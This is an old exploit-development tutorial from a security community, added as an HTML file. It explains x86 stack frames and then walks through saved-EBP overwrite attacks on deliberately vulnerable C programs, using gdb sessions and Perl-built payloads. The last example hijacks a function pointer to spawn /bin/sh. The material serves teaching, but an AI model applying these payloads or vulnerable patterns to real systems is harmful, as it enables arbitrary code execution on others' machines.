@@ -1,0 +1,593 @@
+<html>
+<head>
+<title>Function Stack Frame Manipulation</title>
+<pre>
+                        Gotfault Security Community
+			          (GSC)
+
+---------[ Chapter : 0x300                                      ]
+---------[ Subject : Function Stack Frame Manipulation          ]
+---------[ Author  : barros A.K.A Carlos Barros                 ]
+---------[ Date    : 09/15/2005                                 ]
+---------[ Version : 1.1                                        ]
+
+							  
+|=-----------------------------------------------------------------------------=|
+
+---------[ Table of Contents ]
+
+  0x310 - Objective
+  0x320 - Requisites
+  0x330 - Introduction
+  0x340 - Stack layout
+    0x341 - main()'s stack frame
+    0x342 - func()'s stack frame
+    0x343 - Stack frame destruction
+  0x350 - Manipulating the stack frame
+  0x360 - Having fun with stack frame manipulation
+  0x370 - Conclusion
+
+|=-----------------------------------------------------------------------------=|
+
+---------[ 0x310 - Objective ]
+
+	Manipulate the stack frame of a function in order to execute arbitrary
+code
+
+---------[ 0x320 - Requisites ]
+
+	Introduction to Local Stack Overflow (Basic Module);
+	Local Stack Overflow (Advcanced Module).
+
+---------[ 0x330 - Introduction ]
+
+	Stack frame is a region reserverd to store function's local variables,
+as well as to store parameter to be passed to other functions. Each function
+has you own stack frame and is responsible to create it and save/restore the
+caller's stack frame. In this paper we will discuss how the stack frame works
+and how buffer overflows can be used to manipulate local variables.
+
+---------[ 0x340 - Stack layout ]
+
+	Lets consider this source code:
+
+	barros@gotfault:sources$ cat source1.c
+	void func(char *buf)
+	{
+		printf(&quot;%s\n&quot;,buf);
+	}
+	int main()
+	{
+		char    buf[256];
+		func(buf);
+	}
+	barros@gotfault:sources$ gcc source1.c -o source
+
+	Disassembling this program, we get:
+
+	Dump of assembler code for function main:
+	0x0804822f &lt;main+0&gt;:    push   %ebp
+	0x08048230 &lt;main+1&gt;:    mov    %esp,%ebp
+	0x08048232 &lt;main+3&gt;:    sub    $0x118,%esp
+	0x08048238 &lt;main+9&gt;:    and    $0xfffffff0,%esp
+	0x0804823b &lt;main+12&gt;:   mov    $0x0,%eax
+	0x08048240 &lt;main+17&gt;:   sub    %eax,%esp
+	0x08048242 &lt;main+19&gt;:   lea    0xfffffef8(%ebp),%eax
+	0x08048248 &lt;main+25&gt;:   mov    %eax,(%esp)
+	0x0804824b &lt;main+28&gt;:   call   0x8048214 &lt;func&gt;
+	0x08048250 &lt;main+33&gt;:   leave
+	0x08048251 &lt;main+34&gt;:   ret
+	End of assembler dump.
+	
+	Dump of assembler code for function func:
+	0x08048214 &lt;func+0&gt;:    push   %ebp
+	0x08048215 &lt;func+1&gt;:    mov    %esp,%ebp
+	0x08048217 &lt;func+3&gt;:    sub    $0x8,%esp
+	0x0804821a &lt;func+6&gt;:    mov    0x8(%ebp),%eax
+	0x0804821d &lt;func+9&gt;:    mov    %eax,0x4(%esp)
+	0x08048221 &lt;func+13&gt;:   movl   $0x8095e68,(%esp)
+	0x08048228 &lt;func+20&gt;:   call   0x8049640 &lt;printf&gt;
+	0x0804822d &lt;func+25&gt;:   leave
+	0x0804822e &lt;func+26&gt;:   ret
+	End of assembler dump.
+
+	As you can see, the first 3 instructions and the last 2 instructions
+of both function are the same (almost the same). These 5 instructions are
+responsible for the creation/destruction of the stack frame of the function. 
+Lets study it step by step (creation first):
+
+	* push	%ebp: 
+	
+	This instruction saves the %ebp register (base pointer) of the caller 
+function. The %ebp register is the reference to the function stack frame;
+
+	* mov	%esp,%ebp:
+
+	This instruction initializes the new stack frame, pointing the %ebp
+register to the start of the new frame.
+
+	* sub	$0x118,%esp:
+
+	This instruction reserves the space for the local variables.
+	0x118 = 280 bytes. This is the space reserved to the local variables.
+Our &quot;buf&quot; var is only 256, and our stack space is 280 bytes, why? The reason
+is &quot;alignment&quot;. Newer versions of gcc keeps the alignment in 16 bytes, so
+our 256 bytes var, actually, has 272 bytes. And what about the other 8 bytes?
+It is another &quot;feature&quot; of newer gcc's. Each function has 8 dummy bytes free
+in the local vars region.
+
+	Now I'll show these steps in action. First, I'll show the stack layout
+of the main function and after I'll will describe, step by step, what is going
+one with the register and the stack itself.
+
+---------[ 0x341 - main()'s stack frame ]
+
+			+ | +------------------+
+			  | |   main()'s ret   |
+			  | +------------------+
+			  | | _init saved %ebp | &lt;- %ebp
+			  | +------------------+
+			  | |                  |
+			  | |     dummy[8]     |
+			  | |                  |
+			  | +------------------+
+			  | |                  |
+			  | |     buf[272]     |
+			  | |                  | &lt;- %esp
+			  | +------------------+
+		  	- v
+	
+	The above diagarm represent the main() function stack frame, after the 
+initialization instructions (described at the previous section). The frame is
+delimited by the registers %ebp and %esp. As I said, %ebx is the reference of
+all local variables and parameter, passed to the function. For instance, if
+you look at &lt;main+19&gt; you have the folowing instruction: 
+
+		&lt;main+19&gt;:   lea    0xfffffef8(%ebp),%eax
+
+	This instruction simply gets the address of our &quot;buf&quot; var and stores
+in the %eax register. 0xfffffef8(%ebp) is the sabe of %ebp-264. So, our &quot;buf&quot;
+var starts at this address. This ilustrates the importance of the %ebp 
+register in the context of a function, regarding to local vars. %ebp is of
+the same importance to access parameters passed to function and it will be
+demonstrated in the next section.
+
+---------[ 0x342 - func()'s stack frame ]
+
+	        + | +------------------+----------+
+		  | |   main()'s ret   |          |
+		  | +------------------+          |
+		  | | _init saved %ebp |          |
+		  | +------------------+          |
+	       	  | |                  |          |
+		  | |     dummy[8]     |          |
+		  | |                  |          |
+		  | +------------------+          |
+		  | |                  |          |
+		  | |     buf[272]     |          |
+		  | |                  |          +-&gt; main()'s frame
+		  | +------------------+          |
+		  | |      &amp;buf        |          |
+		  | +------------------+          |
+		  | |    ret addr      |          |
+		  | +------------------+----------+
+		  | | main saved %ebp  | &lt;- %ebp  |
+		  | +------------------+          |
+		  | |                  |          +-&gt; func()'s frame
+		  | |     dummy[8]     |          |
+		  | |                  | &lt;- %esp  |
+		  | +------------------+----------+
+		- v
+
+	This is what the stack looks like when inside func(). Lets take a look
+in this creation process. The sequence of instructions executed is as follows:
+
+	0x08048242 &lt;main+19&gt;:   lea    0xfffffef8(%ebp),%eax
+	0x08048248 &lt;main+25&gt;:   mov    %eax,(%esp)
+	0x0804824b &lt;main+28&gt;:   call   0x8048214 &lt;func&gt;
+	0x08048214 &lt;func+0&gt;:    push   %ebp
+	0x08048215 &lt;func+1&gt;:    mov    %esp,%ebp
+	0x08048217 &lt;func+3&gt;:    sub    $0x8,%esp
+
+	First, the address of the &quot;buf&quot; var is stored in the stack, then, func()
+is called. The call instruction stores the return address in the stack to be
+able to return the execution flow. Withing func(), the main()'s %ebp register
+is stored in the stack (to be restored later). The last two instructions setup the
+new stack frame, pointing %ebp to the same place %esp is pointing to and then
+leaving space to the local vars.
+
+---------[ 0x343 - Stack frame destruction ]
+
+	Ok, I talked about stack frame construction, but, what heppen when the
+func() returns? Well, func MUST restore the main()'s stack frame. To do this,
+there's two instructions in the end of the function, that look like this:
+	
+	0x0804822d &lt;func+25&gt;:   leave
+	0x0804822e &lt;func+26&gt;:   ret
+
+	* leave:
+
+	This instruction can be divided into two new istructions:
+
+		* mov  %ebp,%esp;
+		* pop  %ebp
+
+	The first one restore the stack pointer (%esp). Remember, in the
+creation proccess, when there's a instruction sub $0x8,%esp? Well, this
+other instructions do exactly the oposite. It is like a add $0x8,%esp.
+	The second instruction restores the base pointer (%ebp) saved from the
+main() function. 
+
+	* ret:
+
+	This instructions does the oposite of the call instruction. It pop the
+return address (saved by the call function) into the %eip register. This way,
+the flow of execution returns to the next instruction after the call.
+
+	Now, take the last diagram, apply this steps and take a look what it
+looks like. 
+
+			+ | +------------------+
+			  | |   main()'s ret   |
+			  | +------------------+
+			  | | _init saved %ebp | &lt;- %ebp
+			  | +------------------+
+			  | |                  |
+			  | |     dummy[8]     |
+			  | |                  |
+			  | +------------------+
+			  | |                  |
+			  | |     buf[272]     |
+			  | |                  | &lt;- %esp
+			  | +------------------+
+		  	- v
+
+	Hmm, seems known?? Yes, it is exactly the same layout as the original
+main()'s frame.
+
+---------[ 0x350 - Manipulating local variables ]
+
+	Now, i'll show how to manipulate the contents of local variables using
+a simple BOF. I'll use the following source code as example:
+
+	void func(char *str)
+	{
+	        char    buffer[256];
+	        int     i;
+	
+	        i = 0;
+	        while(*str) buffer[i++] = *str++;
+	}
+	
+	int main(int ac, char **av)
+	{
+		char    *fstring = &quot;First string&quot;;
+		char    *sstring = &quot;Second string&quot;;
+	
+		if(ac &gt;= 2)
+		func(av[1]);
+		printf(&quot;%s =&gt; %s\n&quot;,fstring,sstring);
+	}
+	barros@gotfault:sources$ gcc vuln1.c -o vuln1 -static
+	barros@gotfault:sources$ ./vuln1 
+	First string =&gt; Second string
+
+	As you can see, there's a function (func()) that is vulnerable to a
+simple buffer overflow. We will not overwrite the EIP register, since it is
+not the intent of this paper. Instead, we will overwrite just the saved EBP
+of main(). In this example, we'll build a fake stack frame and overwrite the
+main()'s one with our fake frame. In this fake frame, the strings will be
+inverted, so, the result of the printf will be: Second string =&gt; First string.
+	At first, lets reconstruct main()'s and func()'s stack frame:
+
+	Dump of assembler code for function main:
+	0x08048259 &lt;main+0&gt;:    push   %ebp
+	0x0804825a &lt;main+1&gt;:    mov    %esp,%ebp
+	0x0804825c &lt;main+3&gt;:    sub    $0x18,%esp
+	0x0804825f &lt;main+6&gt;:    and    $0xfffffff0,%esp
+	0x08048262 &lt;main+9&gt;:    mov    $0x0,%eax
+	0x08048267 &lt;main+14&gt;:   sub    %eax,%esp
+	0x08048269 &lt;main+16&gt;:   movl   $0x8095ec8,0xfffffffc(%ebp)
+	0x08048270 &lt;main+23&gt;:   movl   $0x8095ed5,0xfffffff8(%ebp)
+
+	(gdb) x/s 0x8095ec8
+	0x8095ec8 &lt;_IO_stdin_used+4&gt;:    &quot;First string&quot;
+	(gdb) x/s 0x8095ed5
+	0x8095ed5 &lt;_IO_stdin_used+17&gt;:   &quot;Second string&quot;
+	
+			+ | +------------------+
+			  | |   main()'s ret   |
+			  | +------------------+
+			  | | _init saved %ebp | &lt;- %ebp
+			  | +------------------+
+			  | |  &amp;&quot;First string&quot; |
+			  | +------------------+
+			  | | &amp;&quot;Second string&quot; |
+			  | +------------------+
+			  | |                  |
+			  | |    dummy[16]     |
+			  | |                  | &lt;- %esp
+			  | +------------------+
+		  	- v
+
+	Dump of assembler code for function func:
+	0x08048214 &lt;func+0&gt;:    push   %ebp
+	0x08048215 &lt;func+1&gt;:    mov    %esp,%ebp
+	0x08048217 &lt;func+3&gt;:    sub    $0x118,%esp
+
+			+ | +------------------+
+			  | |   func()'s ret   |
+			  | +------------------+
+			  | | main saved %ebp  | &lt;- %ebp
+			  | +------------------+
+			  | |                  |
+			  | |     dummy[8]     |
+			  | |                  |
+			  | +------------------+
+			  | |                  |
+			  | |   buffer[256]    |
+			  | |                  |
+			  | +------------------+
+			  | |        i         |
+			  | +------------------+
+			  | |                  |
+			  | |    dummy[12]     |
+			  | |                  | &lt;- %esp
+			  | +------------------+
+		  	- v
+
+	Now that we now both frames' layout, it is simple to construct our
+buffer. We need to create a fake frame with the same layout of main()'s frame,
+as we will overwrite it. Then, we must overwrite the main's saved %ebp, in
+func(). Our buffer will look like this:
+
+[&amp;&quot;First string&quot;][&amp;&quot;Second string&quot;][_init saved %ebp][main()'s ret][&quot;A&quot;x248][&amp;(buffer+8)]
+|                                                                 |
++------------------------- Frake frame ---------------------------+
+
+	Get the address we need is a very easy task. We already have the two
+strings' address. To get the other addresses, we will use GDB.
+
+	barros@gotfault:sources$ gdb vuln1 -q
+	Using host libthread_db library &quot;/lib/tls/libthread_db.so.1&quot;.
+	(gdb) b main
+	Breakpoint 1 at 0x804825f
+	(gdb) disassemble func
+	Dump of assembler code for function func:
+	0x08048214 &lt;func+0&gt;:    push   %ebp
+	0x08048215 &lt;func+1&gt;:    mov    %esp,%ebp
+	0x08048217 &lt;func+3&gt;:    sub    $0x118,%esp
+	0x0804821d &lt;func+9&gt;:    movl   $0x0,0xfffffef4(%ebp)
+	0x08048227 &lt;func+19&gt;:   mov    0x8(%ebp),%eax
+	0x0804822a &lt;func+22&gt;:   cmpb   $0x0,(%eax)
+	0x0804822d &lt;func+25&gt;:   jne    0x8048231 &lt;func+29&gt;
+	0x0804822f &lt;func+27&gt;:   jmp    0x8048257 &lt;func+67&gt;
+	0x08048231 &lt;func+29&gt;:   mov    0xfffffef4(%ebp),%eax
+	0x08048237 &lt;func+35&gt;:   lea    0xfffffff8(%ebp),%edx
+	0x0804823a &lt;func+38&gt;:   add    %edx,%eax
+	0x0804823c &lt;func+40&gt;:   lea    0xffffff00(%eax),%edx
+	0x08048242 &lt;func+46&gt;:   mov    0x8(%ebp),%eax
+	0x08048245 &lt;func+49&gt;:   incl   0x8(%ebp)
+	0x08048248 &lt;func+52&gt;:   movzbl (%eax),%eax
+	0x0804824b &lt;func+55&gt;:   mov    %al,(%edx)
+	0x0804824d &lt;func+57&gt;:   lea    0xfffffef4(%ebp),%eax
+	0x08048253 &lt;func+63&gt;:   incl   (%eax)
+	0x08048255 &lt;func+65&gt;:   jmp    0x8048227 &lt;func+19&gt;
+	0x08048257 &lt;func+67&gt;:   leave  
+	0x08048258 &lt;func+68&gt;:   ret    
+	End of assembler dump.
+	(gdb) b *func+67
+	Breakpoint 2 at 0x8048257
+	(gdb) r `perl -e 'print&quot;A&quot;x268'`
+	Starting program: /home/barros/exploits/ebp/sources/vuln1 `perl -e
+	'print&quot;A&quot;x268'`
+	
+	Breakpoint 1, 0x0804825f in main ()
+
+	(gdb) x/x $ebp
+	0xbffff3a8:     0xbffff5b8 ==&gt; _init saved %ebp
+	(gdb) x/x $ebp+4
+	0xbffff3ac:     0x0804853c ==&gt; main()'s ret
+	(gdb) 
+	(gdb) c
+	Continuing.
+
+	Breakpoint 2, 0x08048257 in func ()
+	(gdb) x/20x $esp
+	0xbffff160:     0x080ae0ac      0x080ae040      0x00000003      0x00000112
+	0xbffff170:     0x41414141      0x41414141      0x41414141      0x41414141
+	0xbffff180:     0x41414141      0x41414141      0x41414141      0x41414141
+	0xbffff190:     0x41414141      0x41414141      0x41414141      0x41414141
+	0xbffff1a0:     0x41414141      0x41414141      0x41414141      0x41414141
+	(gdb) 
+
+	First string:		0x8095ec8
+	Second string:		0x8095ed5
+	_init saved &amp;ebp:	0xbffff5b8
+	main()'s ret:		0x0804853c
+	&amp;buffer:		0xbffff170
+	
+	Now that we have all the address, it is simple to attack the program.
+Lets use our buffer we've defined above, but now using the addresses we got:
+
+	[0x8095ec8][0x8095ed5][0xbffff5b8][0x0804853c][&quot;A&quot;x264][0xbffff178]
+
+	(gdb) r &quot;`perl -e
+	'print&quot;\xc8\x5e\x09\x08\xd5\x5e\x09\x08\xb8\xf5\xff\xbf\x3c\x85\x04\x08&quot;,&quot;A&quot;x248,&quot;\x78\xf1\xff\xbf&quot;'`&quot;
+	Starting program: /home/barros/exploits/ebp/sources/vuln1 &quot;`perl -e
+	'print&quot;\xc8\x5e\x09\x08\xd5\x5e\x09\x08\xb8\xf5\xff\xbf\x3c\x85\x04\x08&quot;,&quot;A&quot;x248,&quot;\x78\xf1\xff\xbf&quot;'`&quot;
+
+	Breakpoint 1, 0x0804825f in main ()
+	(gdb) c
+	Continuing.
+
+	Breakpoint 2, 0x08048257 in func ()
+	(gdb) c
+	Continuing.
+	Second string =&gt; First string
+
+	Program exited with code 036.
+	(gdb) 
+
+---------[ 0x360 - Having fun with stack frame manipulation ]
+
+	The above example was just a demonstration of what can be done with
+this technique. Now, we'll use it to do some &quot;evil&quot; things. Lets look at the
+following source:
+
+	void func(char *str)
+	{
+		char	buffer[256];
+		int	i;
+
+		i = 0;
+		while(*str) buffer[i++] = *str++;
+	}
+
+	void printString(char *str)
+	{
+		printf(&quot;%s\n&quot;,str);
+	}
+
+	int main(int ac, char **av)
+	{
+		char	*string = &quot;This is a sample string&quot;;
+		void	(*funcptr)(char *) = printString;
+
+		if(ac &gt;= 2) func(av[1]);
+		funcptr(string);
+	}
+	barros@gotfault:sources$ gcc vuln2.c -o vuln2
+	barros@gotfault:sources$ ./vuln2
+	This is a sample string
+
+	This is a simple program that prints a message to the stdout. In
+order to print, the code initializes a function pointer and then, call it.
+Before everything, the vulnerable function (func()) is called to copy av[1]
+into the buffer (just like our last example). Well, our goal here is to
+manipulate the main()'s stack frame to point the *funcptr to some useful
+function. I'll just draw the main()'s frame layout here, cause the concepts
+were explained in the previous section of this article.
+
+	Dump of assembler code for function main:
+	0x080483e4 &lt;main+0&gt;:    push   %ebp
+	0x080483e5 &lt;main+1&gt;:    mov    %esp,%ebp
+	0x080483e7 &lt;main+3&gt;:    sub    $0x18,%esp
+	0x080483ea &lt;main+6&gt;:    and    $0xfffffff0,%esp
+	0x080483ed &lt;main+9&gt;:    mov    $0x0,%eax
+	0x080483f2 &lt;main+14&gt;:   sub    %eax,%esp
+	0x080483f4 &lt;main+16&gt;:   movl   $0x8048548,0xfffffffc(%ebp)
+	0x080483fb &lt;main+23&gt;:   movl   $0x80483c9,0xfffffff8(%ebp)
+
+	(gdb) x/s 0x8048548
+	0x8048548 &lt;_IO_stdin_used+8&gt;:    &quot;This is a sample string&quot;
+	(gdb) x/i 0x80483c9
+	0x80483c9 &lt;printString&gt;:        push   %ebp
+	
+			+ | +------------------+
+			  | |   main()'s ret   |
+			  | +------------------+
+			  | | _init saved %ebp | &lt;- %ebp
+			  | +------------------+
+			  | |      string      |
+			  | +------------------+
+			  | |     funcptr      |
+			  | +------------------+
+			  | |                  |
+			  | |    dummy[16]     |
+			  | |                  | &lt;- %esp
+			  | +------------------+
+		  	- v
+
+	Here we will use the same techinique used in our previous example:
+create a fake stack frame and overwirte main()'s stack frame. To make our
+exploit useful, we have to point funcptr to some useful function. For the sake
+of this example, we will use system(). *string is passed to funcptr, this way
+we can fake string into pointing to &quot;/bin/sh&quot;, this way, when funcptr(string) is
+called, we will call system(&quot;/bin/sh&quot;). Lets prepare our buffer:
+
+[&amp;(system())][&amp;&quot;/bin/sh&quot;][_init saved %ebp][main()'s ret][&quot;A&quot;x248][&amp;(buffer+8)]
+|                                                       |
++------------------- Frake frame -----------------------+
+
+	Again, lets get these addresses. At first, we need to place the string
+&quot;/bin/sh&quot; somewhere in the memory. The best choice is in the environment.
+
+	barros@gotfault:sources$ export BINSH=&quot;/bin/sh&quot;
+
+	Now, with GDB, we can get all this addresses:
+
+	barros@gotfault:sources$ gdb vuln2 -q
+	Using host libthread_db library &quot;/lib/tls/libthread_db.so.1&quot;.
+	(gdb) b main
+	Breakpoint 1 at 0x80483ea
+	(gdb) b *func+67
+	Breakpoint 2 at 0x80483c7
+	(gdb) r `perl -e 'print&quot;A&quot;x268'`
+	Starting program: /home/barros/exploits/ebp/sources/vuln2 `perl -e
+	'print&quot;A&quot;x268'`
+
+	Breakpoint 1, 0x080483ea in main ()
+	(gdb) x/x system
+	0xb7eeda50 &lt;system&gt;:    0x83e58955
+	(gdb) x/x $ebp
+	0xbffff448:     0xbffff4a8 ==&gt; _init saved %ebp
+	(gdb) x/x $ebp+4
+	0xbffff44c:     0xb7ec4974 ==&gt; main()'s ret
+	(gdb) x/x $ebp+16
+	0xbffff458:     0xbffff4e0
+	(gdb) x/20x 0xbffff4e0
+	0xbffff4e0:     0xbffff707      0xbffff713      0xbffff723      0xbffff747
+	0xbffff4f0:     0xbffff75a      0xbffff766      0xbffff99b      0xbffffe67
+	0xbffff500:     0xbffffe72      0xbffffe88      0xbffffef5      0xbfffff0e
+	0xbffff510:     0xbfffff1a      0xbfffff40      0xbfffff54      0xbfffff62
+	0xbffff520:     0xbfffff6b      0xbfffff73      0xbfffff85      0xbfffff94
+	(gdb) x/s 0xbfffff54
+	0xbfffff54:      &quot;BINSH=/bin/sh&quot;
+	(gdb) x/s 0xbfffff54+6
+	0xbfffff5a:      &quot;/bin/sh&quot; ==&gt; &quot;/bin/sh&quot;
+	(gdb) c
+	Continuing.
+
+	Breakpoint 2, 0x080483c7 in func ()
+	(gdb) x/20x $esp
+	0xbffff310:     0xb7eae020      0xb8000ca0      0xb7fe9d2c      0x0000010c
+	0xbffff320:     0x41414141      0x41414141      0x41414141      0x41414141
+	0xbffff330:     0x41414141      0x41414141      0x41414141      0x41414141
+	0xbffff340:     0x41414141      0x41414141      0x41414141      0x41414141
+	0xbffff350:     0x41414141      0x41414141      0x41414141      0x41414141
+
+	system():		0xb7eeda50
+	&quot;/bin/sh&quot;:		0xbfffff5a
+	_init saved %ebp:	0xbffff4a8
+	main()'s ret:		0xb7ec4974
+	&amp;buffer:		0xbffff320
+
+	With this addresses, our buffer will be like this:
+
+	[0xb7eeda50][0xbfffff5a][0xbffff4a8][0xb7ec4974][&quot;A&quot;x248][0xbffff328]
+
+	Lets check it out:
+
+	barros@gotfault:sources$ gdb vuln2 -q
+	Using host libthread_db library &quot;/lib/tls/libthread_db.so.1&quot;.
+	(gdb) r &quot;`perl -e
+	'print&quot;\x50\xda\xee\xb7\x5a\xff\xff\xbf\xa8\xf4\xff\xbf\x74\x49\xec\xb7&quot;,&quot;A&quot;x248,&quot;\x28\xf3\xff\xbf&quot;'`&quot;
+	Starting program: /home/barros/exploits/ebp/sources/vuln2 &quot;`perl -e
+	'print&quot;\x50\xda\xee\xb7\x5a\xff\xff\xbf\xa8\xf4\xff\xbf\x74\x49\xec\xb7&quot;,&quot;A&quot;x248,&quot;\x28\xf3\xff\xbf&quot;'`&quot;
+	sh-2.05b$ exit
+
+	Program exited normally.
+	(gdb)
+
+---------[ 0x370 - Conclusion ]
+
+	Overwriting the EIP is not the only attack vector to use against
+buffer overflows. Overwriting EBP, sometimes, can be more powerfull than the
+normal attack. The last example is a demonstration of how powerfull it can be
+against non-exec stacks, and it is just the basic. You can do a lot a things
+with this technique, just put your mind to work. ;)
+
+
+# milw0rm.com [2006-03-09]</pre>
+</html>
